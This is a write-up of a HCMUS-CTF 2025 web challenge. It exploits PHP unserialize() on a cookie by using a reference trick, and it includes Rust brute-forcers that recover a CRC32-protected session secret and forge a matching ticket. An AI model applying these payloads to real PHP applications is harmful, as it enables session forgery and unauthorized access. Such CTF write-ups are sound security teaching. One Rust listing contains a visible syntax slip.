---
title: HCMUS-CTF 2025 Finals Write-up
published: 2025-07-15
description: "Write-up for HCMUS-CTF's web challenge"
image: ''
tags: [web, misc, ctf]
category: 'write-up'
draft: false 
lang: ''
---

## Overview

This is a write-up for the Web/Misc challenge in the final round of the HCMUS-CTF 2025 competition that I recently participated in. Here is the link to the [challenge](https://github.com/VuxNx/Vietlott-hcmus-ctf-2025). During the competition, three teams solved this challenge (including mine 🤺). Without further ado, let’s dive into the problem.

## Code Audit

First, let’s read the source code to get a general idea of the challenge. I received two files: `index.php`:

```php
<?php
error_reporting(0);
session_start();
require('vietlott.php');

if (!isset($_SESSION['secret'])) {
  $_SESSION['secret'] = random_bytes(4);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $numbers = $_POST["num"];
  $owner = $_POST["owner"];
  if (!is_array($numbers) || !is_string($owner)) {
    die("No hack!");
  }
  $numbers = array_map('intval', $numbers);
  foreach ($numbers as $num) {
    if ($num < 0 || $num > 45) {
      die("What?");
    }
  }
  $ticket = new VietlottTicket();
  $ticket->choices = $numbers;
  $ticket->owner = $owner;
  if (isset($_SESSION['secret'])) {
    $ticket->checksum = crc32(strval(crc32($_SESSION['secret'] . serialize($ticket))));  // One more for good measure
  } else {
    die("What?");
  }
  $_SESSION['last_checksum'] = $ticket->checksum;
  $cookie_ticket = base64_encode(serialize($ticket));
  setcookie('ticket', $cookie_ticket);
}

?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="./static/style.css">
  <script src="./static/app.js" defer></script>
  <title>Vietlott</title>
</head>

<body>
  <h1 class="heading">Vietlott Mega 6/45</h1>
  <?php
  if (isset($_COOKIE['ticket']) || isset($cookie_ticket)) {
    $cookie_ticket = $cookie_ticket ?? $_COOKIE['ticket'];

    if (!($d = base64_decode($cookie_ticket))) die("Invalid ticket!");

    if (!($ticket = unserialize($d))) die("Invalid ticket!");

    if (!($ticket instanceof VietlottTicket)) die("Invalid ticket!");

    if (isset($_SESSION['secret']) && isset($_SESSION['last_checksum'])) {
      $win = $ticket->verify($_SESSION['secret'], $_SESSION['last_checksum']);
    } else {
      $win = false;
    }
  ?>
    <form method="POST" class="inp-form">
      <label class="input">
        <input class="input__field" type="text" name="owner" placeholder=" " autocomplete="off" value="<?php echo $ticket->owner; ?>" />
        <span class="input__label">Enter your name</span>
      </label>
      <div class="container">
        <?php foreach ($ticket->choices as $k => $number) { ?>
          <input type="text" class="num <?php echo $number === $ticket->result[$k] ? "correct" : "incorrect"; ?>" name="num[]" maxlength="2" required autocomplete="off" value="<?php echo $number; ?>">
        <?php } ?>
      </div>
    </form>
    <button class="button-19" style="max-width: fit-content;" role="button">Check!</button>
    <?php
    if ($win) {
      echo "Congratulations! You hit the jackpot, here is your flag:<br>";
      $fp = fopen("/flag.txt", "r");
      echo fgets($fp) . "<br>";
      fclose($fp);
    }
  } else {
    ?>
    <form method="POST" class="inp-form">
      <label class="input">
        <input class="input__field" type="text" name="owner" placeholder=" " autocomplete="off" />
        <span class="input__label">Enter your name</span>
      </label>
      <div class="container">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
        <input type="text" class="num" name="num[]" maxlength="2" required autocomplete="off">
      </div>
    </form>
    <button class="button-19" style="max-width: fit-content;" role="button">Check!</button>
  <?php } ?>
</body>

</html>
```
and `vietlott.php`:

```php
<?php
class VietlottTicket {
  public $owner;
  public $result;
  public $choices;
  public $checksum;

  function verify($secret, $last_checksum) {
    if (!is_array($this->choices)) return false;
    if (count($this->choices) !== 6) return false;

    $ticket_checksum = $this->checksum;
    $this->checksum = null;
    $this->checksum = crc32(strval(crc32($secret . serialize($this))));
    if ($ticket_checksum !== $this->checksum || $last_checksum !== $this->checksum) {
      echo "Ticket's checksum is wrong: " . $this->checksum . "<br>";
      return false;
    }

    if (!ctype_print($this->owner)) {
      echo "Weird name, suspicious hmmm<br>";
      return false; 
    }

    $true_result = roll(6);
    for ($i = 0; $i < 6; $i++) {
      $this->result[$i] = $true_result[$i];
    }

    for ($i = 0; $i < 6; $i++) {
      if ($this->result[$i] !== $this->choices[$i]) {
        return false;
      }
    }

    return true;
  }
}

function roll($n) {
  $res = array();
  for ($i = 0; $i < $n; $i++) {
    $res[$i] = random_int(0, 100000) % 46;
  } 
  return $res;
}

?>
```

Looking at the flow of this web app, it works as follows:
1. You enter the name of the ticket owner.
2. You select numbers on the ticket. There are 6 boxes, and you can choose numbers between 0-45.
3. Check the ticket. If the numbers in the boxes match `$result`, the flag is returned.

### Observations

The first thing that caught my eye when reading the code was the use of `serialize()` and `unserialize()` — a typical sign of POI (PHP Object Injection). Indeed, we can `serialize()` a `VietlottTicket` object with custom attributes (payload) and then set it in the cookie like this:

```php
<?php
class VietlottTicket {
    public $owner;
    public $result;
    public $choices;
    public $checksum;
}

$base_ticket = new VietlottTicket();
$base_ticket->owner = "haha";
$base_ticket->choices = [33,10,15,32,40,13];
$base_ticket->result = [33,10,15,32,40,13]; 
$serialized = serialize($base_ticket);
echo $serialized . "\n";
?>
```

However, there’s an issue: in the `verify()` function, the `$result` array is rolled and overwritten, replacing the values we set, and then compared with each element in `$choices`. So, is there a way to ensure that even when the values change, the elements of these two arrays remain the same? At this point, we think about using references. In PHP, references exist just like in C++, and their behavior is similar. Thus, the above payload is adjusted as follows:

```php
<?php
class VietlottTicket {
    public $owner;
    public $result;
    public $choices;
    public $checksum;
}

$base_ticket = new VietlottTicket();
$base_ticket->owner = "haha";
$base_ticket->choices = [33,10,15,32,40,13];
$base_ticket->result = &$base_ticket->choices; // Reference
$serialized = serialize($base_ticket);
echo $serialized . "\n";
?>
```

But we’re not done yet. Next is the Misc part of this challenge.

### Brute Force

This part consumed quite a bit of time and effort. Here, the web app checks the legitimacy of the ticket through two variables: `$checksum` and `$_SESSION['last_checksum']`. Specifically, the validation mechanism works as follows:
1. A `VietlottTicket` object is initialized, and the `$choices` array is assigned from the `$number` array, with `$owner` as the owner.
2. Check if `$_SESSION['secret']` is initialized. If yes, calculate the checksum using:
```php
$ticket->checksum = crc32(strval(crc32($_SESSION['secret'] . serialize($ticket))));  // One more for good measure
```
3. Assign `$_SESSION['last_checksum'] = $ticket->checksum;` and set the cookie as the base64-encoded serialized ticket.
4. Another branch prechecks before entering the `verify()` function:
```php
<?php
  if (isset($_COOKIE['ticket']) || isset($cookie_ticket)) {
    $cookie_ticket = $cookie_ticket ?? $_COOKIE['ticket'];

    if (!($d = base64_decode($cookie_ticket))) die("Invalid ticket!");

    if (!($ticket = unserialize($d))) die("Invalid ticket!");

    if (!($ticket instanceof VietlottTicket)) die("Invalid ticket!");

    if (isset($_SESSION['secret']) && isset($_SESSION['last_checksum'])) {
      $win = $ticket->verify($_SESSION['secret'], $_SESSION['last_checksum']);
    } else {
      $win = false;
    }
  }else{
    ...
  }
  ?>
```
Thus, to call the sink function `verify()`, two conditions must be met: `secret` and `last_checksum` must be set. `last_checksum` is set only after going through the POST method to calculate the checksum for the first time and assigning it to `$_SESSION['last_checksum']`.

5. Next, in the `verify()` function, the web app double-checks by recalculating the `checksum` and comparing it with `$_SESSION['last_checksum`. After that, the payload's initial "operation" begins.

Based on this observation, we can come up with the first idea: brute-forcing the payload so that its `checksum` matches the `checksum` of a valid ticket. However, to compare the checksums, we need to know the `secret` to brute-force the additional payload. Thus, the initial idea might look like this:
1. Submit a valid ticket to get the cookie and find the checksum.
2. Brute-force the secret key (used for finding collisions later).
3. Since each number in the box ranges from 0-45, the number of possible choices is `pow(45,6)` — very large. With a CRC32 algorithm, hash collisions are inevitable.

## PoC

### Implementing the Brute-Force Code

Since the brute-force space for the secret is `pow(2,32) - 1`, to brute-force as quickly as possible, I implemented the brute-force code in Rust using multithreading:
```rust
use std::thread;
use crc32fast::Hasher; // Faster than zlib for CRC32

// PHP-like CRC32
fn crc32_php(data: &[u8]) -> u32 {
    let mut hasher = Hasher::new();
    hasher.update(data);
    hasher.finalize()
}

fn calc_checksum(secret: &[u8], serialized_ticket: &[u8]) -> u32 {
    let first = crc32_php(&[secret, serialized_ticket].concat());
    let first_str = first.to_string();
    crc32_php(first_str.as_bytes())
}

fn main() {
    let ticket_serialized = b"O:14:\"VietlottTicket\":4:{s:5:\"owner\";s:4:\"haha\";s:6:\"result\";N;s:7:\"choices\";a:6:{i:0;i:1;i:1;i:1;i:2;i:1;i:3;i:1;i:4;i:1;i:5;i:1;}s:8:\"checksum\";N;}";
    let target_checksum: u32 = 169074596; // Replace with real checksum from PHP

    let threads = 12;
    let chunk_size: u64 = (u64::from(u32::MAX) + 1) / threads;

    let mut handles = vec![];

    for t in 0..threads {
        let start = t as u64 * chunk_size;
        let end = if t == threads - 1 {
            u64::from(u32::MAX) + 1
        } else {
            start + chunk_size
        };

        let ticket = ticket_serialized.to_vec();
        let target = target_checksum;

        let handle = thread::spawn(move || {
            for i in start..end {
                let secret = (i as u32).to_be_bytes(); // Big-endian
                if calc_checksum(&secret, &ticket) == target {
                    println!("[+] Found secret: {:02x?} (int: {})", secret, i);
                }
            }
        });

        handles.push(handle);
    }

    for h in handles {
        h.join().unwrap();
    }
}

```
Once again, it’s worth noting that CRC32 is a collision-prone algorithm, so there may be more than one hex string that satisfies the checksum. Thus, we need to dump all results and check them one by one. For the above checksum, I found only one secret: `secret_hex = "fd44d08c"`.

Next, I brute-forced all possibilities in the 6 boxes with my payload to find the set of numbers that satisfy the checksum: `let target_checksum: u32 = 169074596;`. Still implemented in Rust:
```rust
{% raw %}
  use std::sync::{Arc, atomic::{AtomicBool, Ordering}};
  use std::thread;
  use crc32fast::Hasher;

  // PHP-like CRC32
  fn crc32_php(data: &[u8]) -> u32 {
      let mut hasher = Hasher::new();
      hasher.update(data);
      hasher.finalize()
  }

  fn calc_checksum(secret: &[u8], serialized_ticket: &[u8]) -> u32 {
      let first = crc32_php(&[secret, serialized_ticket].concat());
      let first_str = first.to_string();
      crc32_php(first_str.as_bytes())
  }

  // Create PHP serialized string for VietlottTicket
  fn serialize_ticket(owner: &str, result: &[u8]) -> String {
      let mut serialized = format!(
          "O:14:\"VietlottTicket\":4:{{s:5:\"owner\";s:{}:\"{}\";s:6:\"result\";a:6:{{",
          owner.len(),
          owner
      );

      for (i, &value) in result.iter().enumerate() {
          serialized.push_str(&format!("i:{};i:{};", i, value));
      }

      // choices reference to result
      serialized.push_str("}s:7:\"choices\";R:3;");

      // checksum null
      serialized.push_str("s:8:\"checksum\";N;}");

      serialized
  }
  fn main() {
      let target_checksum: u32 = 169074596;
      let secret_hex = "fd44d08c";
      let secret = hex::decode(secret_hex).unwrap();
      let owner = "haha";
      let max_number = 45u8;

      let found = Arc::new(AtomicBool::new(false));
      let threads = 12;
      let range_per_thread = (max_number as usize + 1) / threads + 1;

      let mut handles = vec![];

      for t in 0..threads {
          let start = t * range_per_thread;
          let end = ((t + 1) * range_per_thread).min(max_number as usize + 1);

          let secret_clone = secret.clone();
          let found_flag = Arc::clone(&found);
          let owner_clone = owner.to_string();

          let handle = thread::spawn(move || {
              let mut choices = [0u8; 6];
              for a0 in start as u8..end as u8 {
                  for a1 in 0..=max_number {
                      for a2 in 0..=max_number {
                          for a3 in 0..=max_number {
                              for a4 in 0..=max_number {
                                  for a5 in 0..=max_number {
                                      if found_flag.load(Ordering::Relaxed) {
                                          return;
                                      }
                                      choices = [a0, a1, a2, a3, a4, a5];
                                      let serialized = serialize_ticket(&owner_clone, &choices);
                                      let checksum = calc_checksum(&secret_clone, serialized.as_bytes());
                                      if checksum == target_checksum {
                                          println!("[+] Found choices: {:?}", choices);
                                          found_flag.store(true, Ordering::Relaxed);
                                          return;
                                      }
                                  }
                              }
                          }
                      }
                  }
              }
          });,

          handles.push(handle);
      }

      for h in handles {
          h.join().unwrap();
      }
  }
  {% endraw %}
```
And I found the set of 6 numbers: `[33,10,15,32,40,13]`. At this point, we just need to craft the cookie, encode it in base64, and trigger the flag using a GET method.

:::note
The cookie here includes PHPSESSID and ticket.
:::